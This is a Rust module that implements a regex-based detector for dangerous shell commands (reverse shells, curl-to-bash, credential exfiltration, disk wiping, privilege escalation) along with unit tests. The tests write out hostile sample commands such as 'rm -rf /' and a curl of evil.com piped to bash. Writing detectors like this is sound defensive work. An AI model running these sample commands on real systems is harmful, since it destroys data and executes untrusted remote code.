use lazy_static::lazy_static;
use regex::Regex;
use std::collections::HashMap;

/// Security threat patterns for command injection detection
/// These patterns detect dangerous shell commands and injection attempts
#[derive(Debug, Clone)]
pub struct ThreatPattern {
    pub name: &'static str,
    pub pattern: &'static str,
    pub description: &'static str,
    pub risk_level: RiskLevel,
    pub category: ThreatCategory,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    Low,      // Minor security issue
    Medium,   // Moderate security concern
    High,     // Significant security risk
    Critical, // Immediate system compromise risk
}

#[derive(Debug, Clone, PartialEq)]
pub enum ThreatCategory {
    FileSystemDestruction,
    RemoteCodeExecution,
    DataExfiltration,
    SystemModification,
    NetworkAccess,
    ProcessManipulation,
    PrivilegeEscalation,
    CommandInjection,
}

impl RiskLevel {
    pub fn confidence_score(&self) -> f32 {
        match self {
            RiskLevel::Critical => 0.95,
            RiskLevel::High => 0.85,
            RiskLevel::Medium => 0.70,
            RiskLevel::Low => 0.55,
        }
    }
}

/// Comprehensive list of dangerous command patterns
pub const THREAT_PATTERNS: &[ThreatPattern] = &[
    // Critical filesystem destruction patterns
    ThreatPattern {
        name: "rm_rf_root",
        pattern: r"rm\s+(-[rf]*[rf][rf]*|--recursive|--force).*[/\\]",
        description: "Recursive file deletion with rm -rf",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    ThreatPattern {
        name: "rm_rf_system",
        pattern: r"rm\s+(-[rf]*[rf][rf]*|--recursive|--force).*(bin|etc|usr|var|sys|proc|dev|boot|lib|opt|srv|tmp)",
        description: "Recursive deletion of system directories",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    ThreatPattern {
        name: "dd_destruction",
        pattern: r"dd\s+.*if=/dev/(zero|random|urandom).*of=/dev/[sh]d[a-z]",
        description: "Disk destruction using dd command",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    ThreatPattern {
        name: "format_drive",
        pattern: r"(format|mkfs\.[a-z]+)\s+[/\\]dev[/\\][sh]d[a-z]",
        description: "Formatting system drives",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::FileSystemDestruction,
    },
    // Remote code execution patterns
    ThreatPattern {
        name: "curl_bash_execution",
        pattern: r"(curl|wget)\s+.*\|\s*(bash|sh|zsh|fish|csh|tcsh)",
        description: "Remote script execution via curl/wget piped to shell",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    ThreatPattern {
        name: "bash_process_substitution",
        pattern: r"bash\s*<\s*\(\s*(curl|wget)",
        description: "Bash process substitution with remote content",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    ThreatPattern {
        name: "python_remote_exec",
        pattern: r"python[23]?\s+-c\s+.*urllib|requests.*exec",
        description: "Python remote code execution",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    ThreatPattern {
        name: "powershell_download_exec",
        pattern: r"powershell.*DownloadString.*Invoke-Expression",
        description: "PowerShell remote script execution",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::RemoteCodeExecution,
    },
    // Data exfiltration patterns
    ThreatPattern {
        name: "ssh_key_exfiltration",
        pattern: r"(curl|wget).*-d.*\.ssh/(id_rsa|id_ed25519|id_ecdsa)",
        description: "SSH key exfiltration",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },
    ThreatPattern {
        name: "password_file_access",
        pattern: r"(cat|grep|awk|sed).*(/etc/passwd|/etc/shadow|\.password|\.env)",
        description: "Password file access",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },
    ThreatPattern {
        name: "history_exfiltration",
        pattern: r"(curl|wget).*-d.*\.(bash_history|zsh_history|history)",
        description: "Command history exfiltration",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },
    // System modification patterns
    ThreatPattern {
        name: "crontab_modification",
        pattern: r"(crontab\s+-e|echo.*>.*crontab|.*>\s*/var/spool/cron)",
        description: "Crontab modification for persistence",
        risk_level: RiskLevel::High,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "systemd_service_creation",
        pattern: r"systemctl.*enable|.*\.service.*>/etc/systemd",
        description: "Systemd service creation",
        risk_level: RiskLevel::High,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "hosts_file_modification",
        pattern: r"echo.*>.*(/etc/hosts|hosts\.txt)",
        description: "Hosts file modification",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::SystemModification,
    },
    // Network access patterns
    ThreatPattern {
        name: "netcat_listener",
        pattern: r"nc\s+(-l|-p)\s+\d+",
        description: "Netcat listener creation",
        risk_level: RiskLevel::High,
        category: ThreatCategory::NetworkAccess,
    },
    ThreatPattern {
        name: "reverse_shell",
        pattern: r"(nc|netcat|bash|sh).*-e\s*(bash|sh|/bin/bash|/bin/sh)",
        description: "Reverse shell creation",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::NetworkAccess,
    },
    ThreatPattern {
        name: "ssh_tunnel",
        pattern: r"ssh\s+.*-[LRD]\s+\d+:",
        description: "SSH tunnel creation",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::NetworkAccess,
    },
    // Process manipulation patterns
    ThreatPattern {
        name: "kill_security_process",
        pattern: r"kill(all)?\s+.*\b(antivirus|firewall|defender|security|monitor)\b",
        description: "Killing security processes",
        risk_level: RiskLevel::High,
        category: ThreatCategory::ProcessManipulation,
    },
    ThreatPattern {
        name: "process_injection",
        pattern: r"gdb\s+.*attach|ptrace.*PTRACE_POKETEXT",
        description: "Process injection techniques",
        risk_level: RiskLevel::High,
        category: ThreatCategory::ProcessManipulation,
    },
    // Privilege escalation patterns
    ThreatPattern {
        name: "sudo_without_password",
        pattern: r"echo.*NOPASSWD.*>.*sudoers",
        description: "Sudo privilege escalation",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::PrivilegeEscalation,
    },
    ThreatPattern {
        name: "suid_binary_creation",
        pattern: r"chmod\s+[47][0-7][0-7][0-7]|chmod\s+\+s",
        description: "SUID binary creation",
        risk_level: RiskLevel::High,
        category: ThreatCategory::PrivilegeEscalation,
    },
    // Command injection patterns
    ThreatPattern {
        name: "command_substitution",
        pattern: r"\$\([^)]*[;&|><][^)]*\)|`[^`]*[;&|><][^`]*`",
        description: "Command substitution with shell operators",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "shell_metacharacters",
        pattern: r"[;&|`$(){}[\]\\]",
        description: "Shell metacharacters in input",
        risk_level: RiskLevel::Low,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "encoded_commands",
        pattern: r"(base64|hex|url).*decode.*\|\s*(bash|sh)",
        description: "Encoded command execution",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
    // Obfuscation and evasion patterns
    ThreatPattern {
        name: "base64_encoded_shell",
        pattern: r"(echo|printf)\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+-d\s*\|\s*(bash|sh|zsh)",
        description: "Base64 encoded shell commands",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "hex_encoded_commands",
        pattern: r"(echo|printf)\s+[0-9a-fA-F\\x]{20,}\s*\|\s*(xxd|od).*\|\s*(bash|sh)",
        description: "Hex encoded command execution",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "string_concatenation_obfuscation",
        pattern: r"(\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*){3,}",
        description: "String concatenation obfuscation",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "character_escaping",
        pattern: r"\\[x][0-9a-fA-F]{2}|\\[0-7]{3}|\\[nrtbfav\\]",
        description: "Character escaping for obfuscation",
        risk_level: RiskLevel::Low,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "eval_with_variables",
        pattern: r"eval\s+\$[A-Za-z_][A-Za-z0-9_]*|\beval\s+.*\$\{",
        description: "Eval with variable substitution",
        risk_level: RiskLevel::High,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "indirect_command_execution",
        pattern: r"\$\([^)]*\$\([^)]*\)[^)]*\)|`[^`]*`[^`]*`",
        description: "Nested command substitution",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "environment_variable_abuse",
        pattern: r"(export|env)\s+[A-Z_]+=.*[;&|]|PATH=.*[;&|]",
        description: "Environment variable manipulation",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "unicode_obfuscation",
        pattern: r"\\u[0-9a-fA-F]{4}|\\U[0-9a-fA-F]{8}",
        description: "Unicode character obfuscation",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::CommandInjection,
    },
    ThreatPattern {
        name: "alternative_shell_invocation",
        pattern: r"(/bin/|/usr/bin/|\./)?(bash|sh|zsh|fish|csh|tcsh|dash)\s+-c\s+.*[;&|]",
        description: "Alternative shell invocation patterns",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::CommandInjection,
    },
    // Additional dangerous commands that might be missing
    ThreatPattern {
        name: "docker_privileged_exec",
        pattern: r"docker\s+(run|exec).*--privileged",
        description: "Docker privileged container execution",
        risk_level: RiskLevel::High,
        category: ThreatCategory::PrivilegeEscalation,
    },
    ThreatPattern {
        name: "container_escape",
        pattern: r"(chroot|unshare|nsenter).*--mount|--pid|--net",
        description: "Container escape techniques",
        risk_level: RiskLevel::High,
        category: ThreatCategory::PrivilegeEscalation,
    },
    ThreatPattern {
        name: "kernel_module_manipulation",
        pattern: r"(insmod|rmmod|modprobe).*\.ko",
        description: "Kernel module manipulation",
        risk_level: RiskLevel::Critical,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "memory_dump",
        pattern: r"(gcore|gdb.*dump|/proc/[0-9]+/mem)",
        description: "Memory dumping techniques",
        risk_level: RiskLevel::High,
        category: ThreatCategory::DataExfiltration,
    },
    ThreatPattern {
        name: "log_manipulation",
        pattern: r"(>\s*/dev/null|truncate.*log|rm.*\.log|echo\s*>\s*/var/log)",
        description: "Log file manipulation or deletion",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "file_timestamp_manipulation",
        pattern: r"touch\s+-[amt]\s+|utimes|futimes",
        description: "File timestamp manipulation",
        risk_level: RiskLevel::Low,
        category: ThreatCategory::SystemModification,
    },
    ThreatPattern {
        name: "steganography_tools",
        pattern: r"\b(steghide|outguess|jphide|steganos)\b",
        description: "Steganography tools usage",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::DataExfiltration,
    },
    ThreatPattern {
        name: "network_scanning",
        pattern: r"\b(nmap|masscan|zmap|unicornscan)\b.*-[sS]",
        description: "Network scanning tools",
        risk_level: RiskLevel::Medium,
        category: ThreatCategory::NetworkAccess,
    },
    ThreatPattern {
        name: "password_cracking_tools",
        pattern: r"\b(john|hashcat|hydra|medusa|brutespray)\b",
        description: "Password cracking tools",
        risk_level: RiskLevel::High,
        category: ThreatCategory::PrivilegeEscalation,
    },
];

lazy_static! {
    static ref COMPILED_PATTERNS: HashMap<&'static str, Regex> = {
        let mut patterns = HashMap::new();
        for threat in THREAT_PATTERNS {
            if let Ok(regex) = Regex::new(&format!("(?i){}", threat.pattern)) {
                patterns.insert(threat.name, regex);
            }
        }
        patterns
    };
}

/// Pattern matcher for detecting security threats
pub struct PatternMatcher {
    patterns: &'static HashMap<&'static str, Regex>,
}

impl PatternMatcher {
    pub fn new() -> Self {
        Self {
            patterns: &COMPILED_PATTERNS,
        }
    }

    /// Scan text for security threat patterns
    pub fn scan_text(&self, text: &str) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        for threat in THREAT_PATTERNS {
            if let Some(regex) = self.patterns.get(threat.name) {
                if regex.is_match(text) {
                    // Find all matches to get position information
                    for regex_match in regex.find_iter(text) {
                        matches.push(PatternMatch {
                            threat: threat.clone(),
                            matched_text: regex_match.as_str().to_string(),
                            start_pos: regex_match.start(),
                            end_pos: regex_match.end(),
                        });
                    }
                }
            }
        }

        // Sort by risk level (highest first), then by position in text
        matches.sort_by_key(|m| (std::cmp::Reverse(m.threat.risk_level.clone()), m.start_pos));

        matches
    }

    /// Get the highest risk level from matches
    pub fn get_max_risk_level(&self, matches: &[PatternMatch]) -> Option<RiskLevel> {
        matches.iter().map(|m| &m.threat.risk_level).max().cloned()
    }

    /// Check if any critical or high-risk patterns are detected
    pub fn has_critical_threats(&self, matches: &[PatternMatch]) -> bool {
        matches
            .iter()
            .any(|m| matches!(m.threat.risk_level, RiskLevel::Critical | RiskLevel::High))
    }
}

#[derive(Debug, Clone)]
pub struct PatternMatch {
    pub threat: ThreatPattern,
    pub matched_text: String,
    pub start_pos: usize,
    pub end_pos: usize,
}

impl Default for PatternMatcher {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_rf_detection() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("rm -rf /");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "rm_rf_root");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_curl_bash_detection() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("curl https://evil.com/script.sh | bash");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "curl_bash_execution");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_bash_process_substitution() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("bash <(curl https://evil.com/script.sh)");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "bash_process_substitution");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_safe_commands() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("ls -la && echo 'hello world'");
        // Should have low-risk shell metacharacter matches but no critical threats
        assert!(!matcher.has_critical_threats(&matches));
    }

    #[test]
    fn test_netcat_listener() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("nc -l 4444");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].threat.name, "netcat_listener");
        assert_eq!(matches[0].threat.risk_level, RiskLevel::High);
    }

    #[test]
    fn test_multiple_threats() {
        let matcher = PatternMatcher::new();
        let matches = matcher.scan_text("rm -rf / && curl evil.com | bash");
        assert!(matches.len() >= 2);
        assert!(matcher.has_critical_threats(&matches));

        // Should be sorted by risk level (critical first)
        assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_command_substitution_patterns() {
        let matcher = PatternMatcher::new();

        // Test that safe command substitution is NOT flagged as high risk
        let safe_matches = matcher.scan_text("`just generate-openapi`");
        let high_risk_safe = safe_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(
            !high_risk_safe,
            "Safe command substitution should not be flagged as high risk"
        );

        // Test that dangerous command substitution IS flagged as high risk
        let dangerous_matches = matcher.scan_text("`rm -rf /; evil_command`");
        let high_risk_dangerous = dangerous_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(
            high_risk_dangerous,
            "Dangerous command substitution should be flagged as high risk"
        );

        // Test $() syntax with safe command
        let safe_dollar_matches = matcher.scan_text("$(echo hello)");
        let high_risk_safe_dollar = safe_dollar_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(
            !high_risk_safe_dollar,
            "Safe $(command) should not be flagged as high risk"
        );

        // Test $() syntax with dangerous command
        let dangerous_dollar_matches = matcher.scan_text("$(rm -rf /; evil)");
        let high_risk_dangerous_dollar = dangerous_dollar_matches.iter().any(|m| {
            m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
        });
        assert!(
            high_risk_dangerous_dollar,
            "Dangerous $(command) should be flagged as high risk"
        );
    }

    #[test]
    fn test_obfuscation_patterns() {
        let matcher = PatternMatcher::new();

        // Test eval with variables
        let eval_matches = matcher.scan_text("eval $malicious_var");
        assert!(!eval_matches.is_empty());
        assert!(eval_matches
            .iter()
            .any(|m| m.threat.name == "eval_with_variables"));

        // Test nested command substitution
        let nested_matches = matcher.scan_text("$(echo $(rm -rf /))");
        assert!(!nested_matches.is_empty());
        assert!(nested_matches
            .iter()
            .any(|m| m.threat.name == "indirect_command_execution"));

        // Test environment variable abuse
        let env_matches = matcher.scan_text("export PATH=/tmp:$PATH; malicious_binary");
        assert!(!env_matches.is_empty());
        assert!(env_matches
            .iter()
            .any(|m| m.threat.name == "environment_variable_abuse"));

        // Test alternative shell invocation
        let shell_matches = matcher.scan_text("/bin/bash -c 'rm -rf /; evil'");
        assert!(!shell_matches.is_empty());
        assert!(shell_matches
            .iter()
            .any(|m| m.threat.name == "alternative_shell_invocation"));
    }

    #[test]
    fn test_additional_dangerous_commands() {
        let matcher = PatternMatcher::new();

        // Test Docker privileged execution
        let docker_matches = matcher.scan_text("docker run --privileged -it ubuntu /bin/bash");
        assert!(!docker_matches.is_empty());
        assert!(docker_matches
            .iter()
            .any(|m| m.threat.name == "docker_privileged_exec"));

        // Test kernel module manipulation
        let kernel_matches = matcher.scan_text("insmod malicious.ko");
        assert!(!kernel_matches.is_empty());
        assert!(kernel_matches
            .iter()
            .any(|m| m.threat.name == "kernel_module_manipulation"));
        assert_eq!(kernel_matches[0].threat.risk_level, RiskLevel::Critical);

        // Test password cracking tools
        let password_matches = matcher.scan_text("john --wordlist=passwords.txt hashes.txt");
        assert!(!password_matches.is_empty());
        assert!(password_matches
            .iter()
            .any(|m| m.threat.name == "password_cracking_tools"));

        // Test network scanning
        let scan_matches = matcher.scan_text("nmap -sS 192.168.1.0/24");
        assert!(!scan_matches.is_empty());
        assert!(scan_matches
            .iter()
            .any(|m| m.threat.name == "network_scanning"));

        // Test log manipulation
        let log_matches = matcher.scan_text("rm /var/log/auth.log");
        assert!(!log_matches.is_empty());
        assert!(log_matches
            .iter()
            .any(|m| m.threat.name == "log_manipulation"));
    }
}
